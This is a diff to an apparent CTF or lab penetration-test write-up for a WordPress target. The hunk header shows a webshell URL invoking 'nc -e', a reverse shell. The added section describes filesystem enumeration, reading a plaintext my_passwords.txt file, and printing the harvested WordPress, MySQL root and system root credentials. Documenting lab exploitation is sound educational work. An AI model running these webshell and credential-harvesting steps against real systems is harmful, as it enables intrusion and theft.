@@ -150,12 +150,64 @@ curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=nc -e 
 
 
 ###  Sensitive File Discovery
+After gaining an initial shell on the target system, I performed basic post-exploitation enumeration to identify sensitive files and misconfigurations.
+
+### 7.1 Filesystem Enumeration
+
+While navigating through the WordPress installation directory, I inspected the following path:
 
 ```bash
-find /var/www/html/wordpress -type f -name "*.txt" -exec grep -i password {} \;
+cd /var/www/html/wordpress
+ls -la
 ```
 
-📸 **Screenshot 7:** `my_passwords.txt` discovery
+During this process, I noticed a suspicious file named **`my_passwords.txt`**, which appeared to contain sensitive information.
+
+📸 **Screenshot:** Listing files inside `/var/www/html/wordpress`
+
+---
+
+### 7.2 Credential File Discovery
+
+To inspect the contents of the file, I used the `cat` command:
+
+```bash
+cat /var/www/html/wordpress/my_passwords.txt
+```
+
+📸 **Screenshot:** Contents of `my_passwords.txt`
+
+The file contained multiple plaintext credentials, including WordPress, MySQL, email, and system-level passwords:
+
+```text
+EMAIL: beth@gridloy.hv
+PASSWORD: tears-cartoon
+
+WORDPRESS
+USERNAME: admin
+PASSWORD: b2tGAIvRDpJpNit6q2
+
+MYSQL
+USERNAME: root
+PASSWORD: LhfJ5DuAYN5nsSvB
+
+USERS
+USER: root
+PASSWORD: aceRyanDI
+```
+
+This confirms a critical security misconfiguration, as highly sensitive credentials were stored in plaintext within the web root directory.
+
+### 7.3 Security Impact
+
+Storing credentials in plaintext files accessible from the web directory significantly increases the attack surface and allows attackers to escalate privileges easily once initial access is obtained.
+
+This misconfiguration directly enabled:
+- Unauthorized access to the WordPress admin panel
+- Direct database access as MySQL root
+- Privilege escalation to the system root user
+
+<img width="432" height="269" alt="cevap 5" src="https://github.com/user-attachments/assets/b3b88c62-23b7-48ed-abb0-a34f588f16c8" />
 
 ### 7.2 Extracted Credentials
 
